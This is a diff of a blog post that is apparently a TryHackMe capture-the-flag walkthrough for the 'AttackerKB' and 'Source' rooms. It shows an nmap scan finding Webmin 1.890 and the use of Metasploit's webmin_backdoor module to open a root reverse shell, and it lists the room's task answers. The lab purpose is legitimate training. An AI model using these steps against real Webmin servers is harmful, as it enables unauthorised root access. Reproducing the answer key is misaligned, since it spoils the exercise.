@@ -3,8 +3,116 @@ layout: post
 title: Hello World
 categories: hello
 author: ThelastVvV
-date: 2020-03-11 18:42:53 +0800
-tags: [test, hello]
+date: '2020-03-11 18:42:53 +0800'
+tags:
+  - test
+  - hello
+published: true
 ---
 
-[|IMG|](https://1.bp.blogspot.com/-qrjDLPQGjpg/Xw2M5Gp32OI/AAAAAAAAAM0/ktLIhodQNwQXPCSbvjDj3JE1-QNQzntQgCLcBGAsYHQ/s640/bloggg.jpg)Hallå gubbar , Today i will show you how easy this boxes&nbsp;are in a very simple explanation both [AttackerKB](https://tryhackme.com/room/attackerkb) &amp;&nbsp; [Source](https://tryhackme.com/room/source)&nbsp;1 - Enumeration2 - Exploitation3- Reverse shell4-AttackerKB Tasks1 - Enumerationnmap scan :>nmap -T4 -A -v -Pn Box-ipResults:>PORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:&nbsp;|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)10000/tcp open  http    MiniServ 1.890 (Webmin httpd)2 - ExploitationSource and AttackerKB:One of the attached files of vulnerability is metasploit module that will allow us reverse shell the box so let open Metasploit[https://github.com/rapid7/metasploit-framework/pull/12219](https://www.blogger.com/#)using this command:>msfconsolethen search "the exploit name or version"[|IMG|](https://www.blogger.com/#)then choose unix/webapp/webmin_backdoor[|IMG|](https://www.blogger.com/#)>RHOSTS : Box-ipRPORT: Box-portLHOST: Your-ipSSL : 13- Reverse shell[|IMG|](https://www.blogger.com/#)volia session opened  we are root so let check the hints and hunt the flagsUser Flag:[|IMG|](https://www.blogger.com/#)Root Flag:[|IMG|](https://www.blogger.com/#)4-AttackerKB Tasks:Task 2 -Discovering the Lay of the Land :From Nmap results we can find all our  answers .....Answers:&nbsp;>#2-Webmin#3-1.890#4- from cert bellow figure it out&nbsp;[|IMG|](https://www.blogger.com/#)Task 3 - learning to fly:&nbsp;Just explore Attackerkb then we will be able to answer the following "important to copy directly from [Attackerkb site](https://attackerkb.com/)&nbsp;Answers:&nbsp;>#3 1.890&nbsp;#4 supply chain&nbsp;#5 aug172019&nbsp;#6 githubfileinthetitleSee you next time .....&nbsp;
+ Hallå gubbar , Today i will show you how easy this boxes are in a very simple explanation both [AttackerKB](https://tryhackme.com/room/attackerkb) &  [Source](https://tryhackme.com/room/source).
+ 
+### 1 - Enumeration
+### 2 - Exploitation
+### 3-  Reverse shell
+### 4-AttackerKB Tasks
+
+
+### 1 - Enumerationnmap scan :
+
+> nmap -T4 -A -v -Pn Box-ip
+
+Results:
+
+
+
+> PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+| 2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
+| 256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
+|_ 256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
+10000/tcp open http MiniServ 1.890 (Webmin httpd)
+
+
+### 2 - Exploitation
+Source and AttackerKB:
+
+One of the attached files of vulnerability is metasploit module that will allow us reverse shell the box so let open Metasploit
+
+
+[https://github.com/rapid7/metasploit-framework/pull/12219]()
+
+
+using this command:
+
+
+
+
+> msfconsole
+
+then search "the exploit name or version"
+
+
+
+
+
+then choose > unix/webapp/webmin_backdoor
+
+
+
+
+
+
+
+
+> RHOSTS : Box-ip
+RPORT: Box-port
+LHOST: Your-ip
+SSL : 1
+
+
+### 3- Reverse shell
+
+
+volia session opened we are root so let check the hints and hunt the flags
+
+User Flag:
+
+
+
+
+Root Flag:
+
+
+
+### 4-AttackerKB Tasks:
+
+Task 2 -Discovering the Lay of the Land :
+
+From Nmap results we can find all our answers .....
+
+Answers: 
+
+
+
+#2-Webmin
+#3-1.890
+#4- from cert bellow figure it out
+
+### Task 3 - learning to fly:
+Just explore Attackerkb then we will be able to answer the following "important to copy directly from Attackerkb site 
+Answers: 
+
+#3 1.890 
+#4 supply chain 
+#5 aug172019 
+#6 githubfileinthetitle
+
+
+
+See you next time .....
+
+
+
+
